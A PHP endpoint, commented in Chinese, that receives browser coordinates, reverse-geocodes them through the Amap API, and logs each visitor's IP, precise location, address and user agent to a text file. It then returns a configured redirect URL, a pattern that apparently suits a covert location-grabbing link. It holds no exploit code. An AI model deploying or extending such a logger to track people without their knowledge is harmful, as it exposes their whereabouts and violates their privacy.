<?php
header('Content-Type: application/json');

// 配置部分 - 建议将敏感信息移出代码
$config = [
    'amap_api_key' => getenv('AMAP_API_KEY') ?: '您的高德key', // 高德地图API Key
    'log_file' => 'user_locations.txt',
    'redirect_url_file' => 'redirect_url.txt', // 保留以检查重定向URL
    'allowed_methods' => ['POST']
];

try {
    // 检查请求方法
    if (!in_array($_SERVER['REQUEST_METHOD'], $config['allowed_methods'])) {
        throw new Exception('无效的请求方法', 405);
    }

    // 获取并验证输入数据
    $input = json_decode(file_get_contents('php://input'), true);
    if (json_last_error() !== JSON_ERROR_NONE) {
        // 尝试从POST获取（兼容表单提交）
        $input = $_POST;
    }

    $latitude = filter_var($input['lat'] ?? '', FILTER_VALIDATE_FLOAT);
    $longitude = filter_var($input['lon'] ?? '', FILTER_VALIDATE_FLOAT);
    
    if ($latitude === false || $longitude === false) {
        throw new Exception('无效的坐标参数', 400);
    }

    $user_ip = $_SERVER['REMOTE_ADDR'];
    // 考虑使用更可靠的IP获取方式（如考虑代理情况）
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $user_ip = trim($ips[0]);
    }

    // 获取高德地图API的位置信息
    $geocode_url = sprintf(
        "https://restapi.amap.com/v3/geocode/regeo?location=%s&output=json&key=%s",
        urlencode($longitude . "," . $latitude),
        urlencode($config['amap_api_key'])
    );

    $geocode_response = @file_get_contents($geocode_url);
    if ($geocode_response === false) {
        throw new Exception('无法连接地理位置服务', 503);
    }

    $geocode_data = json_decode($geocode_response, true);
    if (json_last_error() !== JSON_ERROR_NONE || !isset($geocode_data['status'])) {
        throw new Exception('地理位置服务返回无效数据', 502);
    }

    // 准备位置信息
    $info = [
        'ip' => $user_ip,
        'latitude' => $latitude,
        'longitude' => $longitude,
        'location' => ($geocode_data['status'] == 1 && isset($geocode_data['regeocode']['formatted_address'])) 
            ? $geocode_data['regeocode']['formatted_address'] 
            : '无法获取位置信息',
        'time' => time(),
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? ''
    ];

    // 记录位置信息（添加锁防止并发写入问题）
    $log_file = fopen($config['log_file'], 'a');
    if (!$log_file) {
        throw new Exception('无法写入日志文件', 500);
    }
    flock($log_file, LOCK_EX);
    fwrite($log_file, json_encode($info) . "\n");
    flock($log_file, LOCK_UN);
    fclose($log_file);

    // 检查是否有设置的跳转网址
    $response = ['action' => 'none'];
    if (file_exists($config['redirect_url_file'])) {
        $redirect_url = trim(file_get_contents($config['redirect_url_file']));
        
        // 验证URL格式
        if (filter_var($redirect_url, FILTER_VALIDATE_URL)) {
            $response = [
                'action' => 'redirect',
                'url' => $redirect_url
            ];
        }
    }

    echo json_encode($response);

} catch (Exception $e) {
    http_response_code($e->getCode() ?: 500);
    echo json_encode([
        'error' => $e->getMessage(),
        'code' => $e->getCode()
    ]);
    exit;
}
?>